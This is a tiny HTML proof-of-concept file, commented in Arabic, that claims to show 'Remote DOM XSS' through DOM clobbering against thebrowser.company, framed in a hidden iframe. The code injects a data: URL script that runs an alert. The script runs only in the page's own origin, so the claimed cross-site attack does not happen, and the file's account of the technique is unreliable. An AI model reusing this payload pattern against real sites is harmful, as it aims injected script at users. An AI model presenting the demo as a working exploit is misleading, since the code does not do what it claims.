<!DOCTYPE html>
<html>
<body>
<iframe id="target" src="https://thebrowser.company" name="src" style="display:none;"></iframe>

<script>
window.onload = function () {
  let frame = document.getElementById('target');

  // DOM Clobbering باستخدام name="src"
  window.src = frame;

  let s = document.createElement('script');
  s.src = src.src = "data:text/javascript,alert('Remote DOM XSS!')";
  document.body.appendChild(s);
};
</script>
</body>
</html>
